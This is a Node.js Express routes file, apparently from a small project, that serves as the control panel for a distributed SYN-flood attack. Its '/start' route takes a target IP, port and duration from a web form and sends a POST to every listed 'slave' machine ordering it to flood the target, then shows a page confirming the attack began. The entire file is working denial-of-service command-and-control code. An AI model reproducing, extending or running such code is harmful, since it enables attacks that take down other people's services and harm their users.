// Created By: Nicholas Gregorio and Janahan Mathanamohan
// /app/routes.js
// Main module for all the routes

// The intial variables are created
var slaves = require("../config/slaves.js"),
    request = require("request");

module.exports = function(app){

    // This is the route for the main page of the website
    app.get('/',function(req,res){
        console.log('entered');
        res.render('index.ejs');
    });

    // This is the post message to get the values for the syn flood. It will send the values to the slaves
    app.post("/start",function(req,res){
        var prt, slaveSRC, slavePRT, uri;
        var ip = req.body.ip;
        var timeForAttack = req.body.ttl;
        if(req.body.hasOwnProperty('prt')){
            prt = req.body.prt;
        }else{
            prt = 80;
        }
        slave = slaves.slave;
        for(var i = 0; i < slave.length; i++){
            slaveSRC = slave[i].ip;
            slavePRT = slave[i].prt;
            uri = "http://" + slaveSRC + ":" + slavePRT + "/" + "start";
            console.log(uri);
            request({
                uri: uri,
                method: "POST",
                form : {
                    ip: ip,
                    prt: prt,
                    ttl: timeForAttack
                }
            }, function(error,response,body){
                if(error){
                    console.log(error);
                }
            })
        }
        res.redirect('/acknowledgement');
    });

    //Simple page to verify to the user that the attack has started
    app.get('/acknowledgement',function(req,res){
        res.render('acknowledgement.ejs');
    });
}
